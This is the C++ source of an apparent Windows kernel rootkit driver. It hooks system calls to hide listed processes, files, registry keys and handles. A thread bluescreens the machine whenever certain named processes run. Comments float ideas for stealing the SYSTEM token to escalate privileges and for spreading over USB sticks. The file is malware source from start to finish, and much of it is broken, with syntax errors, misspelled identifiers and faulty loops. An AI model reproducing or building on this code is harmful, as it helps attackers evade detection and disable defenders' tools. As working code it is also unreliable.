#include "includes.hpp"
#include "defs.hpp"
#include "hook.hpp"
#include "imports.hpp"

//define global variables

wchar_t dllpath;
wchar_t target_proc;

#define _WIN32_WINNT 0x0600 // Windows Vista and above

NTSTATUS DelayTimeWorked;
// std::vector<const char *> pidstohide = {};
DWORD pidstohide[MAX_HIDE_PROCESSES] = {0};
int pidstohide_count = 0;
HANDLE h_Thread;

typedef NTSYSAPI NTSTATUS ZwEnumerateKey_t(
  [in]            HANDLE                KeyHandle,
  [in]            ULONG                 Index,
  [in]            KEY_INFORMATION_CLASS KeyInformationClass,
  [out, optional] PVOID                 KeyInformation,
  [in]            ULONG                 Length,
  [out]           PULONG                ResultLength
);

//NTSTATUS WINAPI HOOKED_E
typedef NTSTATUS WINAPI ZwQuerySystemInformation_t(
  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
  _Inout_   PVOID                    SystemInformation,
  _In_      ULONG                    SystemInformationLength,
  _Out_opt_ PULONG                   ReturnLength
);

typedef NTSYSAPI NTSTATUS ZwEnumerateValueKey_t(
  [in]            HANDLE                      KeyHandle,
  [in]            ULONG                       Index,
  [in]            KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
  [out, optional] PVOID                       KeyValueInformation,
  [in]            ULONG                       Length,
  [out]           PULONG                      ResultLength
);


// These will hold the Address of the syscalls
ZwQuerySystemInformation_t g_SysInfo = 0;
ZwEnumerateKey_t g_EnumKey = 0;
ZwEnumerateValueKey_t g_EnumValKey = 0;
NtQuerySystemInformation_t g_QueryDir = 0;

//Driver Unload Routine
VOID DriverUnload(PDRIVER_OBJECT DriverObject){
    UNREFERENCED_PARAMETER(DriverObject);
    stopThread = TRUE; //Stop the thread
    if (h_Thread != NULL){
        ZwClose(h_Thread);
        h_Thread = NULL;
    }
    k_hook::stop() //stop the hook
    LARGE_INTEGER integer{ 0 };
    integer.QuadPart = -10000;
    integer.QuadPart *= 10000;
    KeDelayExecutionThread(KernelMode, FALSE, &integer); //Wait for only short for the hook to finish
}

//interger.QuadPart = DelayTime * -1;
//interger.QuadPArt *= DelayTime;

VOID BSOD(){
        KeBugCheckEx( //this triggers a bluescreen
            0xDEADDEAD,
            0, 0, 0, 0
        );
}

NTSTATUS NTAPI HOOKED_NtQueryDirectoryFile( //Hooked function for hiding files and folders
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {

    NTSTATUS status = g_QueryDir( //Call the orginal
        FileHandle, Event, ApcRoutine, ApcContext,
        IoStatusBlock, FileInformation, Length,
        FileInformationClass, ReturnSingleEntry,
        FileName, RestartScan
    );

    if (status == STATUS_SUCCESS && FileInformation != nullptr){ //Check if the call worked
        PFILE_DIRECTORY_INFORMATION dirinfo = (PFILE_DIRECTORY_INFORMATION)FileInformation;
        PFILE_DIRECTORY_INFORMATION prev = nullptr;
        while (true){
            bool shouldHide = false;

            for (int i = 0; i < MAX_HIDE_FILES && HideFiles[i] != NULL; ++i){
                if (_wcsicmp(dirinfo->FileName, HideFiles[i]) == 0) { //compare the file name to all targets
                    shouldHide = true;
                    break;
                }
            }

            if (shouldHide) {
                if (prev){
                    if (dirinfo->NextEntryOffset != 0){
                        prev->NextEntryOffset += dirinfo->NextEntryOffset; //Change the offset to skip the file
                    } else {
                        prev->NextEntryOffset = 0; //break early if it is the last one
                    }
                } else {
                    //memmove again, check on ipad how
		    memmove(dirinfo, (PBYTE)dirinfo + dirinfo->NextEntryOffset, Length - ((PBYTE)dirinfo - (PBYTE)FileInformtation) - dirinfo->NextEntryOffset);
		    continue;
                    
                }
            } else {
                prev = dirinfo;
            }
    
            if (dirinfo->NextEntryOffset == 0) break;  //break if last one

            dirinfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)dirinfo + dirinfo->NextEntryOffset); //loop through
        }
    }
    return status;

}

NTSTATUS NTAPI HOOKED_SYSTEM_PROCESS_INFORMATION( //Hooked NtQuerySystemINformation -> SYSTEM_PROCESS_INFORMATION
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status = g_SysInfo( //Call original one
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    if (status == STATUS_SUCCESS) {
        PSSYSTEM_PROCESS_INFORMATION pspi = (PSSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSSYSTEM_PROCESS_INFORMATION prev = nullptr;
        PSSYSTEM_PROCESS_INFORMATION next = nullptr;
        while (pspi) {
            next = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pspi + pspi->NextEntryOffset);
            bool hide = false;
            for (int i = 0; i < pidstohide_count; ++i) {
                if (pspi->ProcessId == (HANDLE)pidstohide[i]) { //cmp process id to the ones to hide
                    hide = true;
                    break;
                }
            }
            if (hide) { 
                if (prev) { //if there is a previous one
                    if (pspi->NextEntryOffset) { //if we are not last one
                        prev->NextEntryOffset += pspi->NextEntryOffset; //change the offset to skip current process
                    } else {
                        prev->NextEntryOffset = 0; //if we are last one just set it to 0
                    }
                } else {
                    next->Offset = 0;
                    next->NextEntryOffset += pspi->NextEntryOffset;
                    memmove(&pspi, &next, next->NextEntryOffset);
                }
                if (pspi->NextEntryOffset == 0)
                    break; //break if last one
                pspi = (PSSYSTEM_PROCESS_INFORMATION)((PUCHAR)pspi + pspi->NextEntryOffset);
                continue;
            }
            prev = pspi; //set the previous one
            if (pspi->NextEntryOffset == 0)
                break;
            pspi = (PSSYSTEM_PROCESS_INFORMATION)((PUCHAR)pspi + pspi->NextEntryOffset); //loop
        }
    }
    return status;
}

//Thanks a lot to "sam-b" on github for these defs!

NTSTATUS NTAPI HOOKED_SYSTEM_HANDLE_INFORMATION_EX(
    ULONG_PTR HandleCount,
    ULONG_PTR Reserved,
    SYSTEM_HANDLE Handles[1]
)
{
//Again first call orginal etc
    ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);

        status = ZwQuerySystemInformation(reinterpret_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation),  pHandleInfo, len, &len);

	} while (status == (NTSTATUS) 0xc0000004);
    for (int i = 0; i < pHandleInfo->HandleCount; i++) {
        HANDLE pid = pHandleInfo->Handles[i].UniqueProcessId;
        bool hide = false;
        for (int j = 0; j < pidstohide_count; ++j) {
            if (pid == (HANDLE)pidstohide[j]) {
                hide = true;
                break;
            }
        }
        if (hide) {
            memmove(&pHandleInfo->Handles[i], &pHandleInfo->Handles[i+1], (pHandleInfo->HandleCount - i -1) * sizeof(SYSTEM_HANDLE)); //move the next one into the current one
            --HandleCount; //one handle less
            --i; //one loop less
        }
    }
    GlobalFree(pHandleInfo);
    return 0;
}

#define HIDE_REG L"$$hide"
//#define UNICODE

//Thanks to S12-H4CK on medium.com for these hooks!
//Problem: We are calling Nt wich is wrong ofcourse, we need to call Zw, wich can easibly found by using MmGetSystemRoutineAddress
//fix: we already have it for the callback lol
NTSTATUS NTAPI HookedZwEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) {
//Again call orginal etc
    NTSTATUS status = g_EnumKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
    WCHAR* keyName = NULL;

    if (KeyInformationClass == KeyBasicInformation) keyName = ((KEY_BASIC_INFORMATION*)KeyInformation)->Name;
    if (KeyInformationClass == KeyNameInformation) keyName = ((KEY_NAME_INFORMATION*)KeyInformation)->Name;

    for (int i = 0; i < MAX_HIDE_REGS && HIDE_REGS[i] != NULL; ++i) {
        if (wcsstr(keyName, HIDE_REGS[i])) {
            RtlZeroMemory(KeyInformation, Length); //"Delete" the key
            status = STATUS_NO_MORE_ENTRIES; //pretend there is nothing anymore
            break;
        }
    }
    return status;
};

NTSTATUS NTAPI HookedZwEnumerateValueKey(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength) {
    NTSTATUS status = g_EnumValKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
    WCHAR* keyValueName = NULL;
//call orginal again etc (above) and also get the name of the key (below)

    if (KeyValueInformationClass == KeyValueBasicInformation) keyValueName = ((KEY_VALUE_BASIC_INFORMATION*)KeyValueInformation)->Name;
    if (KeyValueInformationClass == KeyValueFullInformation) keyValueName = ((KEY_VALUE_FULL_INFORMATION*)KeyValueInformation)->Name;

    for (int i = 0; i < MAX_HIDE_REGS && HIDE_REGS[i] != NULL; ++i) {
        if (wcsstr(keyValueName, HIDE_REGS[i])) {
            RtlZeroMemory(KeyValueInformation, Length); //same thing as above
            status = STATUS_NO_MORE_ENTRIES;
            break;
        }
    }
    return status;
};


//Thanks to kxnan1337 on UnknownCheats
NTSTATUS name2pid(PCWSTR executable_name, PHANDLE pOutHandle)
{
    NTSTATUS status;
    PVOID buffer = NULL;
    ULONG bufferSize = 0;
    BOOLEAN found = FALSE;
    PSYSTEM_PROCESS_INFORMATION spi = NULL;
    UNICODE_STRING targetName;
     
    *pOutHandle = nullptr;
     
    RtlInitUnicodeString(&targetName, executable_name);
     
    status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);
    if (status != STATUS_INFO_LENGTH_MISMATCH)
        return status;
     
    buffer = ExAllocatePoolWithTag(NonPagedPool, bufferSize, 'proc');
    if (!buffer)
        return STATUS_INSUFFICIENT_RESOURCES;
     
    status = ZwQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(buffer, 'proc');
        return status;
    }
     
    spi = (PSYSTEM_PROCESS_INFORMATION)buffer;
    while (TRUE) {
        if (spi->UniqueProcessId && spi->ImageName.Buffer) {
            UNICODE_STRING currentName;
            RtlInitUnicodeString(&currentName, spi->ImageName.Buffer);
     
            if (RtlCompareUnicodeString(&currentName, &targetName, FALSE) == 0) {
                *pOutHandle = spi->UniqueProcessId;
                found = TRUE;
                break;
            }
        }
     
        if (spi->NextEntryOffset == 0) break;
     
        spi = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)spi + spi->NextEntryOffset);
    }
     
    ExFreePoolWithTag(buffer, 'proc');
     
    return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

BOOLEAN IsProcessRunning(const wchar_t *processName){
    log_debug("Checking if process %s is running...", processName);
    BOOLEAN exists = FALSE;
    PEPROCESS process = NULL;
    PEPROCESS current = PsGetNextProcess(NULL);

    while (current){
        const char* imageName = PsGetProcessImagefileName()
        if (imageName == processName){
            return TRUE;
        }
    }
    return FALSE;
}

/*
idea to start a process woth higher privileges;
EoP in shellcode by stealing SYSTEM token
*/

//Big thanks to "ThomasonZoa" on github for InfinityHookProMax!

void __fastcall SysInfo_call_back(unsigned long ssdt_index, void** ssdt_address){
    UNREFERENCED_PARAMETER(ssdt_index);
    if (*ssdt_address == g_SysInfo) *sddt_address = HOOKED_SYSTEM_PROCESS_INFORMATION; 
}

void __fastcall EnumerateKey_callback(unsigned long ssdt_index, void** ssdt_address){
    UNREFERENCED_PARAMETER(ssdt_index);
    if (*ssdt_address == g_EnumKey) *ssdt_address = HookedZwEnumerateKey;
}

void __fastcall EnumValKey_callback(unsigned long ssdt_index, void** ssdt_address){
    UNREFERENCED_PARAMETER(ssdt_index);
    if (*ssdt_address == g_EnumValKey) *ssdt_address = HookedZwEnumerateValueKey;
}

void __fastcall HideHandles_callback(unsigned long ssdt_index, void** ssdt_address) {
    UNREFERENCED_PARAMETER(ssdt_index);
    if (*ssdt_address == g_SysInfo) *ssdt_address = HOOKED_SYSTEM_HANDLE_INFORMATION_EX;
}

void __fastcall HideFIles_callback(unsigned long ssdt_index, void** ssdt_address){
    UNREFERENCED_PARAMETER(ssdt_address);
    if (*ssdt_address == g_QueryDir) *ssdt_address = HOOKED_NtQueryDirectoryFile;
}



BOOLEAN stopThread = FALSE;
void BsodThread(
    PVOID StartContext
) {
    UNREFERENCED_PARAMETER(StartContext);
    while (!stopThread) {
        
        for (int i = 0; i < MAX_BSOD_PROCESSES && BSODProcesses[i] != NULL; ++i) {
            if (IsProcessRunning(BSODProcesses[i])) {
                BSOD(); //if the process is running we bsod
            }
        }
	    LARGE_INTEGER integer{ 0 };
	    integer.QuadPart = -10000;
	    integer.QuadPart *= 10000;
	    KeDelayExecutionThread(KernelMode, FALSE, &integer); //just to not cook the cpu
        //Maybe make it attach to USB sticks that are plugged in? To spread but that is more "wormy" behaviour
    }
    PsTerminateSystemThread(STATUS_SUCCESS)
}

VOID DelayTimeWorkItem(PDEVICE_OBJECT DeviceObject, PVOID Context){
	//this is for when you want to delay execution time, check the DriverEntry for comments
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_WORKITEM workItem = (PIO_WORKITEM)Context;

    LARGE_INTEGER time{ 0 };
    time.QuadPart = DelayTime * -1;
    time.QuadPart *= DelayTime;
    KeDelayExecutionThread(KernelMode, FALSE, &time);

    DWORD pid;
    pidstohide_count = 0;
    for (int i = 0; i < MAX_HIDE_PROCESSES && HideProcesses[i] != NULL; ++i) {
        log_debug("Retrieving PID of %s", HideProcesses[i]);
        HANDLE foundPid = 0;
        UNICODE_STRING procName;
        WCHAR procNameW[260];
        size_t outSize = 0;
        mbstowcs_s(&outSize, procNameW, HideProcesses[i], _countof(procNameW) - 1);
        procNameW[_countof(procNameW) - 1] = L'\0';

        NTSTATUS status = name2pid(procNameW, &foundPid);
        if (NT_SUCCESS(status) && foundPid != 0 && pidstohide_count < MAX_HIDE_PROCESSES) {
            pidstohide[pidstohide_count++] = (DWORD)(ULONG_PTR)foundPid;
            log_debug("Found PID %u for %s", (unsigned int)foundPid, HideProcesses[i]);
        }
    }

    NTSTATUS Hook;
    UNICODE_STRING str;
    WCHAR name[256]{ L"ZwQuerySystemInformation" };
    RtlInitUnicodeString(&str, name);
    if (E_HideProcesses){
        g_SysInfo = (ZwQuerySystemInformation_t)MmGetSystemRoutineAddress(&str);
        Hook = k_hook::initialize(SysInfo_call_back) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
        if (Hook == STATUS_UNSUCCESSFUL){
            log_debug("Failed to create a hook beetween ZwQuerySystemInformation");
        }
    }

    if (E_HideFiles){
        wcscpy(name, L"ZwEnumeratekey");
        RtlInitUnicodeString(&str, name);
        g_EnumKey = (ZwEnumerateKey_t)MmGetSystemRoutineAddress(&str);
        Hook = k_hook::initialize(EnumerateKey_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
        if (Hook == STATUS_UNSUCCESSFUL){
            log_debug("Failed to create a hook beetween ZwEnumerateKey");
        }
    }

    if (E_HideKeys){
        wcscpy(name, L"ZwEnumerateValueKey");
        RtlInitUnicodeString(&str, name);
        g_EnumValKey = (ZwEnumerateValueKey_t)MmGetSystemRoutineAddress(&str);
        Hook = k_hook::initialize(EnumValKey_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
        if (Hook == STATUS_UNSUCCESSFUL){
            log_debug("Failed to create a hook beetween ZwEnumerateValueKey");
        }
    }

    if (HideHandles) {
        wcscpy(name, L"ZwQuerySystemInformation");
        RtlInitUnicodeString(&str, name);
        g_SysInfo = (ZwQuerySystemInformation_t)MmGetSystemRoutineAddress(&str);
        Hook = k_hook::initialize(HideHandles_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
        if (Hook == STATUS_UNSUCCESSFUL) {
            log_debug("Failed to hook ZwQuerySysremInformation for: SYSTEM_HANDLE_INFORMATION_EX");
        }
    }

    if (E_HideFiles){
        wscpy(name, L"ZwQueryDirectoryFile");
        RtlInitUnicodeString(&str, name);
        g_QueryDir = (NtQuerySystemInformation_t)MmGetSystemRoutineAddress(&str);
        Hook = k_hook::initialize(HideFIles_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
        if (HOOK == STATUS_UNSUCCESSFUL){
            log_debug("Failed to hook ZwQueryDirectoryFile!");
        }
    }

    NTSTATUS status = PsCreateSystemThread(&h_Thread, THREAD_ALL_ACCESS, NULL, NULL, NULL, KstartRoutine, NULL);
    if (!NT_SUCCESS(status)){
        log_debug("Failed to create a thread.");
        DelayTimeWorked = status;
    }
    DelayTimeWorked = NT_SUCCESS;
    IoFreeWorkItem(workItem);
}

void StartDelayedInit(PDEVICE_OBJECT DeviceObject)
{
    PIO_WORKITEM workItem = IoAllocateWorkItem(DeviceObject);
    if (workItem)
    {
        IoQueueWorkItem(workItem, DelayTimeWorkItem, DelayedWorkQueue, workItem);
    }
}


NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath, HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpreserved){
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = DriverUnload;
    if (DelayExcecution){
        /*
        log_debug("Sleeping for %d seconds...", (int)DelayTime);
        LARGE_INTEGER time{ 0 };
        time.QuadPart = DelayTime * -1;
        time.QuadPart *= DelayTime;
        KeDelayExecutionThread(KernelMode, FALSE, &time);
        log_debug("Times up!");
        */
        StartDelayedInit(DriverObject); //Start worker 
    } else {
        DWORD pid;
        pidstohide_count = 0;
        for (int i = 0; i < MAX_HIDE_PROCESSES && HideProcesses[i] != NULL; ++i) {
		//get the pid of all the processes given in the list
            log_debug("Retrieving PID of %s", HideProcesses[i]);
            HANDLE foundPid = 0;
            UNICODE_STRING procName;
            WCHAR procNameW[260];
            size_t outSize = 0;
            mbstowcs_s(&outSize, procNameW, HideProcesses[i], _countof(procNameW) - 1);
            procNameW[_countof(procNameW) - 1] = L'\0';

            NTSTATUS status = name2pid(procNameW, &foundPid);
            if (NT_SUCCESS(status) && foundPid != 0 && pidstohide_count < MAX_HIDE_PROCESSES) {
                pidstohide[pidstohide_count++] = (DWORD)(ULONG_PTR)foundPid;
                log_debug("Found PID %u for %s", (unsigned int)foundPid, HideProcesses[i]);
            }
        }

        NTSTATUS Hook;
        UNICODE_STRING str;
        WCHAR name[256]{ L"ZwQuerySystemInformation" };
        RtlInitUnicodeString(&str, name);
        if (E_HideProcesses){
            g_SysInfo = (ZwQuerySystemInformation_t)MmGetSystemRoutineAddress(&str); //hook
            Hook = k_hook::initialize(SysInfo_call_back) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
            if (Hook == STATUS_UNSUCCESSFUL){
                log_debug("Failed to create a hook beetween ZwQuerySystemInformation");
            }
        }

        if (E_HideKeys){
            wcscpy(name, L"ZwEnumeratekey"); //hook
            RtlInitUnicodeString(&str, name);
            g_EnumKey = (ZwEnumerateKey_t)MmGetSystemRoutineAddress(&str);
            Hook = k_hook::initialize(EnumerateKey_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
            if (Hook == STATUS_UNSUCCESSFUL){
                log_debug("Failed to create a hook beetween ZwEnumerateKey");
            }
        }

        if (E_HideKeys){ //hook
            wcscpy(name, L"ZwEnumerateValueKey");
            RtlInitUnicodeString(&str, name);
            g_EnumValKey = (ZwEnumerateValueKey_t)MmGetSystemRoutineAddress(&str);
            Hook = k_hook::initialize(EnumValKey_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
            if (Hook == STATUS_UNSUCCESSFUL){
                log_debug("Failed to create a hook beetween ZwEnumerateValueKey");
            }
        }

        if (HideHandles) { //hook
            wcscpy(name, L"ZwQuerySystemInformation");
            RtlInitUnicodeString(&str, name);
            g_SysInfo = (ZwQuerySystemInformation_t)MmGetSystemRoutineAddress(&str);
            Hook = k_hook::initialize(HideHandles_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
            if (Hook == STATUS_UNSUCCESSFUL) {
                log_debug("Failed to hook ZwQuerySystemInformation for: SYSTEM_HANDLE_INFORMATION_EX");
            }
        }

        if (E_HideFiles){
            wscpy(name, L"ZwQueryDirectoryFile");
            RtlInitUnicodeString(&str, name);
            g_QueryDir = (NtQuerySystemInformation_t)MmGetSystemRoutineAddress(&str);
            Hook = k_hook::initialize(HideFIles_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
            if (HOOK == STATUS_UNSUCCESSFUL){
                log_debug("Failed to hook ZwQueryDirectoryFile!");
            }
        }

        NTSTATUS status = PsCreateSystemThread(&h_Thread, THREAD_ALL_ACCESS, NULL, NULL, NULL, KstartRoutine, NULL); //I honestly forgot why and I dont feel like figuring it out
        if (!NT_SUCCESS(status)){
            log_debug("Failed to create a thread.");
            return status;
        }
    }

    /*
    DWORD pid;
    pidstohide_count = 0;
    for (int i = 0; i < MAX_HIDE_PROCESSES && HideProcesses[i] != NULL; ++i) {
        log_debug("Retrieving PID of %s", HideProcesses[i]);
        HANDLE foundPid = 0;
        UNICODE_STRING procName;
        WCHAR procNameW[260];
        size_t outSize = 0;
        mbstowcs_s(&outSize, procNameW, HideProcesses[i], _countof(procNameW) - 1);
        procNameW[_countof(procNameW) - 1] = L'\0';

        NTSTATUS status = name2pid(procNameW, &foundPid);
        if (NT_SUCCESS(status) && foundPid != 0 && pidstohide_count < MAX_HIDE_PROCESSES) {
            pidstohide[pidstohide_count++] = (DWORD)(ULONG_PTR)foundPid;
            log_debug("Found PID %u for %s", (unsigned int)foundPid, HideProcesses[i]);
        }
    }

    NTSTATUS Hook;
    UNICODE_STRING str;
    WCHAR name[256]{ L"ZwQuerySystemInformation" };
    RtlInitUnicodeString(&str, name);
    if (E_HideProcesses){
        g_SysInfo = (ZwQuerySystemInformation_t)MmGetSystemRoutineAddress(&str);
        Hook = k_hook::initialize(SysInfo_call_back) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
        if (Hook == STATUS_UNSUCCESSFUL){
            log_debug("Failed to create a hook beetween ZwQuerySystemInformation");
        }
    }

    if (E_HideFiles){
        wcscpy(name, L"ZwEnumeratekey");
        RtlInitUnicodeString(&str, name);
        g_EnumKey = (ZwEnumerateKey_t)MmGetSystemRoutineAddress(&str);
        Hook = k_hook::initialize(EnumerateKey_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
        if (Hook == STATUS_UNSUCCESSFUL){
            log_debug("Failed to create a hook beetween ZwEnumerateKey");
        }
    }

    if (E_HideKeys){
        wcscpy(name, L"ZwEnumerateValueKey");
        RtlInitUnicodeString(&str, name);
        g_EnumValKey = (ZwEnumerateValueKey_t)MmGetSystemRoutineAddress(&str);
        Hook = k_hook::initialize(EnumValKey_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
        if (Hook == STATUS_UNSUCCESSFUL){
            log_debug("Failed to create a hook beetween ZwEnumerateValueKey");
        }
    }

    if (HideHandles) {
        wcscpy(name, L"ZwQuerySystemInformation");
        RtlInitUnicodeString(&str, name);
        g_SysInfo = (ZwQuerySystemInformation_t)MmGetSystemRoutineAddress(&str);
        Hook = k_hook::initialize(HideHandles_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
        if (Hook == STATUS_UNSUCCESSFUL) {
            log_debug("Failed to hook ZwQuerySysremInformation for: SYSTEM_HANDLE_INFORMATION_EX");
        }
    }

    NTSTATUS status = PsCreateSystemThread(&h_Thread, THREAD_ALL_ACCESS, NULL, NULL, NULL, KstartRoutine, NULL);
    if (!NT_SUCCESS(status)){
        log_debug("Failed to create a thread.");
        return status;
    }
    */
    if (h_Thread != NULL){
        ZwClose(h_Thread);
        h_Thread = NULL;
    }
    return STATUS_SUCCESS;
}
